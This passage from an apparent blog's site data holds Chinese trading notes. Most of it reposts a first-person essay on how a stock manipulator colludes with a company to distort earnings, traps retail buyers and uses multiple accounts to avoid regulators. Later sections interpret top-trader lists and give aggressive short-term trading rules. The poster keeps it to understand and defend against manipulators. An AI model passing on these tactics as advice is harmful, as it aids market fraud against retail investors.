些技术指标特点。偶然乎，必然乎（有意思，偶然中的必然）。</p>\n<p>这里解释一下我为什么要猛杀游资。</p>\n<p>其实这关乎自己的短期收益，因为短线客和游资的钱最好赚，他们持筹码的时间短，可以使我非常短的时间里获利。例如套牢盘，你只能一次性的赚他一下，他然后就不动了，你就拿他一点办法都没有，这中间有时候长达几年，在这几年里我可是要吃要喝的；基本面派也使我获利不多，因为他们的利润我还要和公司均分。</p>\n<p>但短线客和游资就不同了，我在一个波段中就可以获利丰厚。那怎么做呢?</p>\n<p>第一是逐步拉升，这时候技术指标就开始走好，技术派的人一看技术指标，一般都容易被诱惑进来，这中间我就边拉边卖，需要控制的就是在顶背离之前（背驰段之中）将筹码交他们手中，使他们看上去技术指标仍然没有到顶，股价还可以涨得更高，这时候第二天来个冲高回落，然后第三天猛然下跌，他们基本上就开始交枪了（这个动作很常见），不用我来，股价就下去了，这中间自然我设定好价位来捡果实。</p>\n<p>对游资更是这样，上半段我来拉，游资一看股价看涨，立即蜂拥而来，那下半段我就将部分筹码交给他们，第二天我来个低开低走，游资一看势头不对，立即出逃，这时候我就要看出逃数量，并计算自己的成果，如果出逃数量足够多，那我下午就拉起，因为大部分短线客都走了，我就不需要支付多少利润出去，很容易将股价拉起来，而我在这两天来回的差价最少是赚交易额的3%左右。</p>\n<p>但发现没有走多少时那我就继续向下做。这就是不少散户疑问的，为什么我一卖就涨，一买就跌啊?因为你跟大部分人的行为是一致的。（能坐庄的都能打单，对筹码结构很清楚，主力当然根据短线客中大部分人的行为行动）呵呵。</p>\n<p>二、坐庄的风险是什么？</p>\n<p>1）监管风险：一是操作这只股票的不会是我一个庄，一般都是邀请几个人来联手，就像大草原上的猎狗一样，采用群体战术才能更容易获得成功。要是一个人，第一不一定有这个实力，第二就是太容易被人抓住把柄，搞不好打不到狐狸还惹一身骚，所以，邀请朋友来合作是肯定的，就谁主谁次的问题了。既然是合作，风险也是明显的，当市场出现波动时，其中一个朋友立马放水，这时候你就栽了，很长时间的辛苦都会打水漂。</p>\n<p>2）大势风险：还有一个问题是，当市场趋势向下时，自己却没发现，因为筹码还在自己手中，就想硬扛，这时候同样会完蛋，前几次大牛市结束后不少庄家摔跟头就在这上面。那么，应该如何应对风险，这就是，第一注意指标股的动向，因为坐庄的人对大盘指数动向非常敏感，当指标股向上，而一些主力控制的次要股却滞涨，或者有掉头迹象，那我就要先于股指下跌之前想办法将手里的筹码尽量的都交到散户手里去，尽量的腾出现金，只要手上有充足现金，是涨是跌我都不怕。涨了，我手上剩余的筹码完全可以将其打下来；要是跌了，那就可以购买更多的筹码。当大盘到底准备反转时，也同样会痕迹明显（从这里来看，就是指标股向下，主力控制的次要股却滞跌，或有掉头迹象）。</p>\n<p>三、谈谈顶和底的问题。</p>\n<p>现在不少人都在关心大盘跌到什么位置才是底，2000、1800、1235？说老实话，我不知道，我不但不知道大盘会跌到什么点位为底，我会连自己坐庄的股票能跌到什么价格为底都不知道，怎么能测算大盘。有人说，20元跌到5元行不行？到底了吗？我说不行，也许跌到1~2元，也许会到8元就算到底了，在股市里没什么顶和底之说，真正起作用的就是供求关系，当跌到供求平衡时，底自然就到了。</p>\n<p>例如我的股票，我每天都在让它波动，涨涨跌跌，但某一天我发现，我卖出去的股票，用这些钱买不回来更多或者同样多的股票了，这时候我就不可能再向下做了，这里就应该是它的底了。也许是5元的位置，也许1元的位置还不到，又有谁知道在哪个位置能达平衡呢，只能不断的测试。</p>\n<p>顶部也一样，我向上拉，却没了跟风的，那我高价买来的股票又能派发给谁？当然，我拉高给你看价格却又是一码事，底部也一样（同样，震仓中继调整其实就是出货和吸筹的变种，只不过该时段的对手盘是短线盘）。</p>\n<p>在指数里，同样如此，如果进出资金能达到平衡，那指数就到底了；如果不能，一直要跌到平衡为止。</p>\n<p>四、庄家在下跌中是如何赚钱的？</p>\n<p>不少人有时候不理解，庄家的成本是20元，他将股价打到10元或者15元，他不也亏了吗？这真是傻庄，其实散户是不明白的，庄家赚钱的手段很多时候是和散户不同的。我来举个例子，600331，当时有些机构的成本是70多元，但开盘后连砸7个跌停板，最后在38元被打开，按理说机构亏惨，如果庄不砸跌停板，出货的价位不是高些吗？损失不是小些吗？</p>\n<p>其实不是这种情况，不砸跌停板出货，散户也会跟着出；而承接盘有限，机构的货是出不掉的，慢慢的下跌机构损失会更惨，并且你由于价格没有吸引力，找不到对手盘，那就成了钝刀子割肉，痛苦只有自知（主力的弱点）。</p>\n<p>采用了猛砸跌停的办法，市场的目光就会集中到那上面来（市场知名度），当跌到一半时，有协同私募或者机构开始巨量吃单，因为在这几天的跌停中市场的关注度非常高，而出现巨单吃货了，这说明这时的股价应该反弹了，技术上超卖出现，股价腰斩，怎么着都要反弹个百分之十几到二十，所以散户、大户一哄而上，机构卖单被哄抢。但现实情况并不是散户和大户们所想象的，在熊市中放巨量的往往都是出货，看似大单扫货，其实就是庄家们设的陷阱，然后利益分享。</p>\n<p>再举个南车上市的例子，上市价超过发行价60%以上，5个机构席位齐刷刷的排在购买的前5名，这些机构傻了吗？非要溢价60%来接盘，特别在熊市中，还怕买不到筹码？如果等几天再买，也许到发行价都有可能。其实，机构们一点不傻，这不过是机构之间穿连裆裤的表演，那些获得60%以上溢价的会给这些接盘的机构分配一定利润的，而且这些机构买入的也并不多，更多的筹码是溢价交给了其他人，包括大量散户手中了。对接入大部分高溢价筹码的这部分人，那些获利者就不用考虑什么了。</p>\n<p>这里我还回到前面，600331，那些机构70多元的成本，却卖出38元，那不巨亏吗？这不过是散户思维，从现金数额来说，机构是大放血了，但从筹码角度来说，机构可以按现在复权价格18元，等于赚了一倍的筹码，只要涨回30多，机构的本就回来了，而那些守在38以上的人，只好等驴年马月了。这还不排除后面继续下跌的可能，如果股价继续下跌，机构就更容易获利。</p>\n<p>所以，我操作的股票我就希望它能跌下来，尽量的低。举个例子，在20元到18元区间，我出掉了手中的20%股票，在18到16区间我又出掉18%的股票，后面我就要回补，因为在这种下跌的情况下，不少止损盘开始涌现，还有些人要补仓，这时候我就要根据筹码情况做反弹，为什么要做反弹呢？主要是吸引抄底盘进来，当然，如果抄底盘巨多，第二天我就再反手做空。</p>\n<p>（主力的优势在于可控盘，短期顶底都是自己的，短差做起来极端顺手，所以短线盘的出路就在于：利用船小好调头的优势使操作水平高于主力，最起码要和主力持平。根据这里所述，思路之一即对抄底跟风盘的判断，但是主力的弱点同时也是主力的优点，主力很容易了解到抄底跟风盘的情况，而散户则不知。这就构成了一对矛盾，导致主力和散户优劣平衡。）</p>\n<p>一般情况下第一天的反弹抄底的是不多的，只要进行两天，散户一看，这个股怎么天天涨，特别是割肉盘和补仓盘，他们一般都会追进来，而高位的一看涨了几天，不卖算了，等几天也许还能赚点。这时候我再反手做空，将他们套住。这中间我赚多少？因为拉的当中还要派发利润，所以，每一段的下跌可以保持一定的利润。</p>\n<p>那我为什么希望我坐庄的股价尽量低？你想想，你如果开个商场，你是希望你经营的货物便宜还是贵？自然是便宜的好，因为这样一来所用资金量就少。10元加1元，人家就嫌贵了；如果1元加1角，不显山露水的，没人和你计较，而和10元和1元所赚比例却是一样的。股票也一样，1元股票涨到1。5元，没多少人感觉什么；但10元涨到15元呢？这就是中国股票市场牛短熊长的根本原因，庄没几个希望股价很高来增加自己的成本。</p>\n<p>五、谈谈散户的和庄家的定位问题。</p>\n<p>在一个大草原上，小股民就是羊群，而庄家是狼。我这样定位大家可能没什么意见吧，中国股市里70%股民赔钱，这基本上是真实的。就像打麻将一样，四个人打，三个人赔。这三个人的钱自然流入到那一个人口袋里去了，也就是说，股民所赔的数万亿既没消失，也没挥发，而是转移，转移到少数人口袋里去了。这就是狼吃羊的故事。</p>\n<p>在草原中，羊看到狼会跑，为什么？怕它把自己吃了。但在股市里却不一样，大部分人买股票喜欢买有庄股，说有庄股拉起来就凶了，会涨的快，最好是强庄。羊在草原上吃什么？吃草。它会选择有狼的地方去吗？而且这个狼还非常彪悍。绝对不会。</p>\n<p>这就是股民的自我定位上的错误，你本来是羊，吃草就行了，这个草就是找个业绩良好的股，在合适的价格下把它买来，然后每年等着分红送股来升值（中国股市分红吗？）。但大部分股民不这样，总想跟着狼后面吃点残羹剩渣，这还有不亏损的道理？所以，大草原上的羊群大部分保留，而股民大部分都被吃了。</p>\n<p>六、主力是如何对散户进行教育灌输的？</p>\n<p>我说的这个题目，不少人可能觉得新鲜，没听说过这样的事，主力还能对我进行教育灌输？是不是维稳或者保障群众财产性收入之类的。我说不是，其实你没感觉，那就是主力的成功，主力不需要你感觉什么，只要你按着他的指挥去做就行。主力有这样的本事？那他叫我割肉我就割肉，让我站顶我就站顶，那我的钱不都让主力赚去了？对，情况就是这样。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>所以就要做一些笔记呗</p>\n<p>有一些摘自知乎和雪球。观点和意见都不尽同意。</p>\n<h2 id=\"入场和出场\"><a href=\"#入场和出场\" class=\"headerlink\" title=\"入场和出场\"></a>入场和出场</h2><p>假如我是一个庄家，我会怎么做？</p>\n<p>股票市场的定律是一赢两平七亏，意思是70%以上的人都会亏损。那散户如何才能站到赢利的10%人的群体中？我认为，机构为了赚散户钱，不断的在研究散户心理和行为学，我们散户不妨反过来，把自己当成机构投资者，也来研究一下机构的心理和行为学，这样才能在这个充满陷阱、欺诈、骗术和谣言四起的市场里立于不败之地。</p>\n<p>如果我是机构投资者，要想做一支股票，我认为我先要找到一支大小合适，前景无需多么优秀，但几年之内绝对不会倒闭的那一种。然后我去拜会该公司领导，告诉他我想投资他那支股票，请他们配合。如何配合呢？就是在我吸筹时，在公报时尽量将业绩放平，或者适当隐藏利润，这一点公司很容易做到，只要对报表进行适当调整就行了，例如，将某些损益一个季度提完，使其报表看上去亏损；或者将后面数年的费用半年摊完，这都使得当期报表非常难看。</p>\n<p>在这之前，我肯定是要进一些筹码的，这些筹码主要用来砸盘的。怎么收集这些砸盘的筹码？我不会每天慢慢去收集，因为这样会使股票天天上涨，反而难以收到足够的筹码，还容易被散户抢酬，并使技术指标形成向上趋势，更使自己收集成本提高。我会在某一天用大涨的办法来收集，当连跌数天后，散户都悲观失望，猛然一个大涨，套牢的看到了希望，不会抛出；而短线获利的，可能就交枪了，其实，在这个价位我只是要砸盘的筹码，不需要收集很多，因此用猛然大涨的办法就很容易达到目的（见底前平台，成交量会放大）。</p>\n<p>第二天来个低开。为什么要低开而不高开，因为我昨天收集的筹码并不准备获利，而且要让昨天追风进去的短线筹码帮我砸盘，如果高开，很容易让短线筹码获利，他们就会在下跌途中有更多的资金来跟我抢酬，所以一定要低开，消耗这些短线资金（盈利的短线盘很关注这只股，而亏损的短线盘则极少再次关注它）。</p>\n<p>在这个下跌途中，我将逐步用单托底，因为我要形成自己的底仓（难道这不会造成成交量的放大，而非极度缩量？）。经过几天的连续下跌，有些割肉的筹码就会回补自己的仓位，这时候我不能让他们回补，我必须迅速的吃上去让他们追风（直线拔升方式常见的原因），当形成追风盘时，我将在底部的部分筹码高抛，一是为了降低成本，二是腾出资金，然后再迅速的砸下去。同样的，我会边托边砸，这样一来我就会得到更多价格更低的筹码。</p>\n<p>当跌到很低位时，基本上就没人和我抢筹码了，因为在这个下跌途中，我通过不断的高抛低吸，不断的大幅度振荡，将大部分抄底的，抢反弹的都套在下跌途中，或者将他们亏损怠尽，使其不敢再来涉足这个股票，这时候我的目的就达到了（把买盘都赶出去）。而公司的配合在这时就非常关键，长时间的业绩没有任何起色，使大部分散户因怀疑其会不会ST，因而恐惧惊慌，高位筹码就会不断的掉落，我就可以在底部横盘当中不断的高抛低吸来收集筹码，这个可能需要较长时间，关键看顶部筹码掉落程度而定，如果高位筹码长时间的不松动，那我就不会去拉这只股票。（筹码流动）</p>\n<p>当筹码收集足够多时，公司的业绩也会转好了，因为在我收集筹码当中，公司将后面几年能想的出来的损益，或者费用都在那一年半载中摊完了，后面的报表当然好看。这时候我拉起来毫不费力，也无需多大成本。当这个市场里其他人看到这个股原来这么优秀，必然跟风者众，我就在这这当中逐步减仓。（（1）筹码结构（资金结构）（2）技术指标（3）业绩预期）</p>\n<p>公司能如此配合，那他能得到什么好处？其实很简单，我将股票拉到高位，他们也能卖个好价钱；在低位时，他们同样可以购入自己的股票，还能挣得名声，这样一来收益会相当可观，何乐而不为？</p>\n<p>这当然要和大盘走势相同，在这中间，散户该知道怎么办了吧。</p>\n<p>当然，如果我做庄，还必需考虑很多问题：第一是证监会的监控，他们虽然老虎不敢碰，或者就是为虎作猖，但捏死个把苍蝇还是不成问题的，所以，操控股票不能让他们抓住把柄，这时候就要考虑多户头，或者拉几个私募大户集体作战。</p>\n<p>第二要考虑产业资本的问题，如果我们拉的时候，他们看到利润可观，结果大量抛出筹码，那我们就惨了，必然会亏本出局，在做之前就必需先和他们沟通好，而且还要了解他们手上的流通盘是多少，抛售意向如何，这就是大小非问题。</p>\n<p>第三个要考虑的是老庄，如果这个股没有被老庄放弃，那我是尽量不会去碰的，因为一但被老庄反做，那你死得就惨了，就像中国联通套游资一样，那死得是非常惨的，所以，选股非常重要。</p>\n<p>第四个就是大盘状况，跟风的多不多，社会上的存量资金足不足，就像现在这样，大部分散户或者大户都被大宰一刀，这时候就不适宜做股票，你拉人家卖，结果把自己套在里面。那现在最适宜的就是砸股票。一般人都有个心态，20元买的股，跌到15元不卖，跌到10元不卖，跌到5元仍然没多少会人卖，但是你要跌到2元再拉回4元，不少人一看翻倍基本上都会割肉的，特别是长时间的向下或者横盘（当然，翻一倍后作中期调整的概率可能性，在操作系统上可认为是100%）。</p>\n<p>如果这些问题都解决了，砸盘就要开始。砸多少为适宜？根据大盘状况，每天操盘必需跟着大盘走，当大盘大跌时，你必需深砸下去，这时候成本很低，只要用少量筹码将关键点位砸开即可，会有止损盘帮你接着砸下去。但是尾盘必需进一些筹码，防止第二天大盘走低或者走高，有一定量筹码就好灵活掌握，也就是说，要在操盘时盯着指标股（借势才是合格的操盘手）。</p>\n<p>为什么要盯着指标股去做？关键就在于成本，随着大盘波动，你的成本最低，指标股跌时，你也跌，所用砸盘筹码量最少，因为没有多少人敢买，可以深砸（并不是什么时候都可以深砸高拉的）。当大盘涨时你去拉，同样无须买多少，只要将关键点位的筹码买掉即可，有人会将股价推上去，到一定高点，你还可以将低位进的筹码出掉一些，这样可以腾出一点资金做一点差价。所以，我们看到的股市局面就是要涨一起涨，要跌大家都去跌。</p>\n<p>在股市中的人分好几种，趋势投资者，套牢后不理不睬者，技术派，基本面派，长线客，短线炒家等等。</p>\n<p>我要在这个股票里做庄，这些人我都要面对，尽量的让他们在我控制的这个股票里少赚或者割肉而去，这时候我就要用很多办法来对付，因为他们赚多了，意味着我就赚少了，他们不割肉，我就赚不到钱（针对某一只股票，主力要面对的是阶段性对手盘，同样阶段性对手盘也面对着阶段性对手盘）。</p>\n<p>对趋势投资者，我没什么好办法，只能将他们看做锁仓的一员；但对其他人，我平时的吃喝玩乐就全靠他们了。我一般最喜欢套牢后不理不睬的，这些人把钱交给我后帮我锁定了大部分筹码，使我在底位有充足的资金纵横驰骋（？待定，低位时主力要高抛低吸短差收股票，但因持仓量少对盘面的控制力差，所以非常需要锁仓套牢盘，套牢盘的不动，造就了主力（新资金）的异动（才能让交易者看出来））。</p>\n<p>基本面派也是我喜欢的第二位，因为当我将股价拉高后他们基本就接手了，企业的基本面在我拉高股价后变得非常亮丽，他们就会来接盘；等他们接完后公司基本面就发生改变，他们在低位就将筹码再还给我。</p>\n<p>技术派一般短线较多，喜欢做波段，这里的人有自认为技术高明的，什么KDJ金叉、死叉，什么MACD、CR、量价关系，什么费波纳奇黄金分割位，什么艾略特的波浪理论，还有江恩曲线等等，等等，但我做股票一般不看这个，我一般只盯着今天我下多少单，在某些价位进来多少单，大一些的户头在什么价位进出。这个对我来说非常关键，因为这决定了第二天该如何操作，有时候需要对他们安抚，让他们帮忙将股票在手上多留几天，以使活动筹码减少。但有时候就必须让他们出局，特别是短线客，当今天发现短线游资进来多了，第二天不管怎样都要将他们杀出局，哪怕逆大盘而动（不杀不行啊，不杀盘面就会失控，破坏坐庄计划）。回过头来看，呵呵，真搞笑，K线走的还真符合某些技术指标特点。偶然乎，必然乎（有意思，偶然中的必然）。</p>\n<p>这里解释一下我为什么要猛杀游资。</p>\n<p>其实这关乎自己的短期收益，因为短线客和游资的钱最好赚，他们持筹码的时间短，可以使我非常短的时间里获利。例如套牢盘，你只能一次性的赚他一下，他然后就不动了，你就拿他一点办法都没有，这中间有时候长达几年，在这几年里我可是要吃要喝的；基本面派也使我获利不多，因为他们的利润我还要和公司均分。</p>\n<p>但短线客和游资就不同了，我在一个波段中就可以获利丰厚。那怎么做呢?</p>\n<p>第一是逐步拉升，这时候技术指标就开始走好，技术派的人一看技术指标，一般都容易被诱惑进来，这中间我就边拉边卖，需要控制的就是在顶背离之前（背驰段之中）将筹码交他们手中，使他们看上去技术指标仍然没有到顶，股价还可以涨得更高，这时候第二天来个冲高回落，然后第三天猛然下跌，他们基本上就开始交枪了（这个动作很常见），不用我来，股价就下去了，这中间自然我设定好价位来捡果实。</p>\n<p>对游资更是这样，上半段我来拉，游资一看股价看涨，立即蜂拥而来，那下半段我就将部分筹码交给他们，第二天我来个低开低走，游资一看势头不对，立即出逃，这时候我就要看出逃数量，并计算自己的成果，如果出逃数量足够多，那我下午就拉起，因为大部分短线客都走了，我就不需要支付多少利润出去，很容易将股价拉起来，而我在这两天来回的差价最少是赚交易额的3%左右。</p>\n<p>但发现没有走多少时那我就继续向下做。这就是不少散户疑问的，为什么我一卖就涨，一买就跌啊?因为你跟大部分人的行为是一致的。（能坐庄的都能打单，对筹码结构很清楚，主力当然根据短线客中大部分人的行为行动）呵呵。</p>\n<p>二、坐庄的风险是什么？</p>\n<p>1）监管风险：一是操作这只股票的不会是我一个庄，一般都是邀请几个人来联手，就像大草原上的猎狗一样，采用群体战术才能更容易获得成功。要是一个人，第一不一定有这个实力，第二就是太容易被人抓住把柄，搞不好打不到狐狸还惹一身骚，所以，邀请朋友来合作是肯定的，就谁主谁次的问题了。既然是合作，风险也是明显的，当市场出现波动时，其中一个朋友立马放水，这时候你就栽了，很长时间的辛苦都会打水漂。</p>\n<p>2）大势风险：还有一个问题是，当市场趋势向下时，自己却没发现，因为筹码还在自己手中，就想硬扛，这时候同样会完蛋，前几次大牛市结束后不少庄家摔跟头就在这上面。那么，应该如何应对风险，这就是，第一注意指标股的动向，因为坐庄的人对大盘指数动向非常敏感，当指标股向上，而一些主力控制的次要股却滞涨，或者有掉头迹象，那我就要先于股指下跌之前想办法将手里的筹码尽量的都交到散户手里去，尽量的腾出现金，只要手上有充足现金，是涨是跌我都不怕。涨了，我手上剩余的筹码完全可以将其打下来；要是跌了，那就可以购买更多的筹码。当大盘到底准备反转时，也同样会痕迹明显（从这里来看，就是指标股向下，主力控制的次要股却滞跌，或有掉头迹象）。</p>\n<p>三、谈谈顶和底的问题。</p>\n<p>现在不少人都在关心大盘跌到什么位置才是底，2000、1800、1235？说老实话，我不知道，我不但不知道大盘会跌到什么点位为底，我会连自己坐庄的股票能跌到什么价格为底都不知道，怎么能测算大盘。有人说，20元跌到5元行不行？到底了吗？我说不行，也许跌到1~2元，也许会到8元就算到底了，在股市里没什么顶和底之说，真正起作用的就是供求关系，当跌到供求平衡时，底自然就到了。</p>\n<p>例如我的股票，我每天都在让它波动，涨涨跌跌，但某一天我发现，我卖出去的股票，用这些钱买不回来更多或者同样多的股票了，这时候我就不可能再向下做了，这里就应该是它的底了。也许是5元的位置，也许1元的位置还不到，又有谁知道在哪个位置能达平衡呢，只能不断的测试。</p>\n<p>顶部也一样，我向上拉，却没了跟风的，那我高价买来的股票又能派发给谁？当然，我拉高给你看价格却又是一码事，底部也一样（同样，震仓中继调整其实就是出货和吸筹的变种，只不过该时段的对手盘是短线盘）。</p>\n<p>在指数里，同样如此，如果进出资金能达到平衡，那指数就到底了；如果不能，一直要跌到平衡为止。</p>\n<p>四、庄家在下跌中是如何赚钱的？</p>\n<p>不少人有时候不理解，庄家的成本是20元，他将股价打到10元或者15元，他不也亏了吗？这真是傻庄，其实散户是不明白的，庄家赚钱的手段很多时候是和散户不同的。我来举个例子，600331，当时有些机构的成本是70多元，但开盘后连砸7个跌停板，最后在38元被打开，按理说机构亏惨，如果庄不砸跌停板，出货的价位不是高些吗？损失不是小些吗？</p>\n<p>其实不是这种情况，不砸跌停板出货，散户也会跟着出；而承接盘有限，机构的货是出不掉的，慢慢的下跌机构损失会更惨，并且你由于价格没有吸引力，找不到对手盘，那就成了钝刀子割肉，痛苦只有自知（主力的弱点）。</p>\n<p>采用了猛砸跌停的办法，市场的目光就会集中到那上面来（市场知名度），当跌到一半时，有协同私募或者机构开始巨量吃单，因为在这几天的跌停中市场的关注度非常高，而出现巨单吃货了，这说明这时的股价应该反弹了，技术上超卖出现，股价腰斩，怎么着都要反弹个百分之十几到二十，所以散户、大户一哄而上，机构卖单被哄抢。但现实情况并不是散户和大户们所想象的，在熊市中放巨量的往往都是出货，看似大单扫货，其实就是庄家们设的陷阱，然后利益分享。</p>\n<p>再举个南车上市的例子，上市价超过发行价60%以上，5个机构席位齐刷刷的排在购买的前5名，这些机构傻了吗？非要溢价60%来接盘，特别在熊市中，还怕买不到筹码？如果等几天再买，也许到发行价都有可能。其实，机构们一点不傻，这不过是机构之间穿连裆裤的表演，那些获得60%以上溢价的会给这些接盘的机构分配一定利润的，而且这些机构买入的也并不多，更多的筹码是溢价交给了其他人，包括大量散户手中了。对接入大部分高溢价筹码的这部分人，那些获利者就不用考虑什么了。</p>\n<p>这里我还回到前面，600331，那些机构70多元的成本，却卖出38元，那不巨亏吗？这不过是散户思维，从现金数额来说，机构是大放血了，但从筹码角度来说，机构可以按现在复权价格18元，等于赚了一倍的筹码，只要涨回30多，机构的本就回来了，而那些守在38以上的人，只好等驴年马月了。这还不排除后面继续下跌的可能，如果股价继续下跌，机构就更容易获利。</p>\n<p>所以，我操作的股票我就希望它能跌下来，尽量的低。举个例子，在20元到18元区间，我出掉了手中的20%股票，在18到16区间我又出掉18%的股票，后面我就要回补，因为在这种下跌的情况下，不少止损盘开始涌现，还有些人要补仓，这时候我就要根据筹码情况做反弹，为什么要做反弹呢？主要是吸引抄底盘进来，当然，如果抄底盘巨多，第二天我就再反手做空。</p>\n<p>（主力的优势在于可控盘，短期顶底都是自己的，短差做起来极端顺手，所以短线盘的出路就在于：利用船小好调头的优势使操作水平高于主力，最起码要和主力持平。根据这里所述，思路之一即对抄底跟风盘的判断，但是主力的弱点同时也是主力的优点，主力很容易了解到抄底跟风盘的情况，而散户则不知。这就构成了一对矛盾，导致主力和散户优劣平衡。）</p>\n<p>一般情况下第一天的反弹抄底的是不多的，只要进行两天，散户一看，这个股怎么天天涨，特别是割肉盘和补仓盘，他们一般都会追进来，而高位的一看涨了几天，不卖算了，等几天也许还能赚点。这时候我再反手做空，将他们套住。这中间我赚多少？因为拉的当中还要派发利润，所以，每一段的下跌可以保持一定的利润。</p>\n<p>那我为什么希望我坐庄的股价尽量低？你想想，你如果开个商场，你是希望你经营的货物便宜还是贵？自然是便宜的好，因为这样一来所用资金量就少。10元加1元，人家就嫌贵了；如果1元加1角，不显山露水的，没人和你计较，而和10元和1元所赚比例却是一样的。股票也一样，1元股票涨到1。5元，没多少人感觉什么；但10元涨到15元呢？这就是中国股票市场牛短熊长的根本原因，庄没几个希望股价很高来增加自己的成本。</p>\n<p>五、谈谈散户的和庄家的定位问题。</p>\n<p>在一个大草原上，小股民就是羊群，而庄家是狼。我这样定位大家可能没什么意见吧，中国股市里70%股民赔钱，这基本上是真实的。就像打麻将一样，四个人打，三个人赔。这三个人的钱自然流入到那一个人口袋里去了，也就是说，股民所赔的数万亿既没消失，也没挥发，而是转移，转移到少数人口袋里去了。这就是狼吃羊的故事。</p>\n<p>在草原中，羊看到狼会跑，为什么？怕它把自己吃了。但在股市里却不一样，大部分人买股票喜欢买有庄股，说有庄股拉起来就凶了，会涨的快，最好是强庄。羊在草原上吃什么？吃草。它会选择有狼的地方去吗？而且这个狼还非常彪悍。绝对不会。</p>\n<p>这就是股民的自我定位上的错误，你本来是羊，吃草就行了，这个草就是找个业绩良好的股，在合适的价格下把它买来，然后每年等着分红送股来升值（中国股市分红吗？）。但大部分股民不这样，总想跟着狼后面吃点残羹剩渣，这还有不亏损的道理？所以，大草原上的羊群大部分保留，而股民大部分都被吃了。</p>\n<p>六、主力是如何对散户进行教育灌输的？</p>\n<p>我说的这个题目，不少人可能觉得新鲜，没听说过这样的事，主力还能对我进行教育灌输？是不是维稳或者保障群众财产性收入之类的。我说不是，其实你没感觉，那就是主力的成功，主力不需要你感觉什么，只要你按着他的指挥去做就行。主力有这样的本事？那他叫我割肉我就割肉，让我站顶我就站顶，那我的钱不都让主力赚去了？对，情况就是这样。</p>\n"},{"layout":"title","title":"业余时间开始二级市场交易","date":"2017-04-12T14:11:06.000Z","_content":"\n所以就要做一些笔记呗\n\n有一些摘自知乎和雪球。观点和意见都不尽同意。\n\n\n## 《如何看懂龙虎榜》\n\n一、纯游资对决(交易席位均为游资)  \n\n1、买卖双方力量比对，买方总金额越大越好。买方席位前5名的总资金要远大于卖方席位前5名总资金。并且买一的资金要远大于卖一的资金，最好是1.5倍以上。而买一和买二的金额差不能太大，否则会容易造成一家独大，后市意味着抛压也大。\n\n2、如果是第一次涨停，在龙虎榜交易数据当中，买方数据为纯买入最好，表示新进资金入场后市还将走高。另外第一次涨停后留意买一席位是直接出局、锁仓、继续加码买进还是做差价？通常直接出局代表了行情一日游，锁仓说明行情可持续，等待别的资金接力拉高。继续加码买进表示强烈看好。做差价说明买一实力不够强。个股的大行情都是游资接力完成的，不会是某一个游资来推动整轮行情的发展。因此通常2-3个涨停之后如果买一继续锁仓，别的游资只会是观望了，因为持仓量太大造成的抛压也大。只有当买一出局后，别的游资才考虑进场接力拉升。所以说行情的初中期换手率是一个非常重要的参考指标。一个游资的离去会吸引另外游资的进驻。另外还有一种情况就是边拉升边对倒的游资，对倒涨停是为了投入少量的资金来达到涨停效应，持续力不会太强。\n\n3、留意游资的身份和操盘风格，是一线知名游资还是名不见经传的游资？在最近是否经常上榜？操盘风格如何？一日游为主还是波段为主或者是喜欢与机构共舞等等。通常一日游资口碑不太好，上榜了也不会对行情有推动作用，反而打击做多的积极性。波段游资则比较受欢迎。\n\n4、留意龙虎榜数据买方席位知名度，越知名越好，数量越多越好。比如银河绍兴路、光大杭州庆春路、光大奉化南山路、财通温岭东辉北路、中信杭州延安路、中信杭州定安路、华泰益田路荣超商务中心等这些著名游资出现3个以上，代表着一线游资对这个题材个股的高度认可，后市持续力强。\n\n二、游资和机构博弈(交易席位为游资机构混杂)\n\n1、买方中机构出现的数量越多越好，机构当日买入金额占总成交金额比例越大越好。一次性锁定筹码集中度越高越好。因为多家机构进驻的个股基本面都比较不错，符合市场调研评判的标准，通常引发中级行情！当游资和机构达成共识合力推升股价，短线往往爆发力比较强，后市继续上涨概率也很大。\n\n2、买方中的买一席位是机构最好，并且卖方的5个席位中不出现机构最好；\n\n3、如果买方席位和卖方席位均有机构出现，卖方的5个席位中机构出现的数量越少越好，金额越小越好。如果卖方的机构席位比买方机构席位旗鼓相当甚至还要多，说明机构之间分歧非常之大，短期方向具有不确定性，对于交易数据当中的游资席位来说也会打退堂鼓，应该观望等待明朗。\n\n4、当买方5个席位均为游资，而卖方所有席位均为机构的时候，说明机构早就有出局的想法，有可能是该股基本面发生了转变，或者其他的不确定性让机构调仓换股。另外这种情况也经常发生在股价炒作末期的高位，机构认为风险较大时就会组团出货，通常砸至跌停。\n\n5、当买方均为机构卖方全部为游资席位，如果股价已经在炒作高位，发生这样的交易数据则机构有利益输送嫌疑，利用机构效应吸引散户高位接盘来帮助游资顺利出货。记住：市场上没有100%的完美，太美好的东西其背后一定掩饰着什么。\n\n\n## 超短\n\n以下是一个很激进的原则，并不能认可太多\n\n超短线的精髓在于做的是自己市值的主升浪，而不是某支股票的主升浪。从百万到千万到亿，是做人生的主升浪。这个大逻辑必须非常清楚。我很懂，自己为何做超短线！目标必须是亿为单位，不能目光短浅！我的操作纪律：\n\n1.永不抄底，只做强势股追涨，只做上升通道。\n\n2.不做日成交额低于5亿的股票。\n\n3.持股周期1~3天，连扳预期除外，坚决不把超短投机失败了当价值投资来搞。\n\n4.只选热点概念和有板块效应的标，判断失败搞错热点果断割肉出货，热点持续卖飞再买回来，老想卖山顶的都是屌丝，卖飞买回来才是高富帅。\n\n5.只做牛票，不做牛市，宁可卖飞，也不傻等。\n\n选择交易这一行，挫折感和失败感会伴随我们一生，失败时我们会郁闷、会痛苦、会绝望；胜利时，我们会目空一切，以为自己掌握了股市赚钱的法宝，这些将会重复，未来将战无不胜，万亿富翁指日可待。交易虽时而欲哭无泪，时而高兴流泪，但我们却依然爱它，因为平淡的生活乏味，挑战的生活才有激情，才有梦想。在预判中跟随， 在跟随中应变，没有预判的跟随是盲从， 没有应变的预判是意淫。找对路，并坚持！\n\n生活里注定会有许多风雨，认识人生是一种欣然的态度和热爱，一路上的经过，如果你坚持不下去了，请想想当初的那般热情。股市常有迷茫的时候，只要熬过了，就没什么可以打败你。\n\n> 它文章挺老了，但是毕竟是经验\n\n## 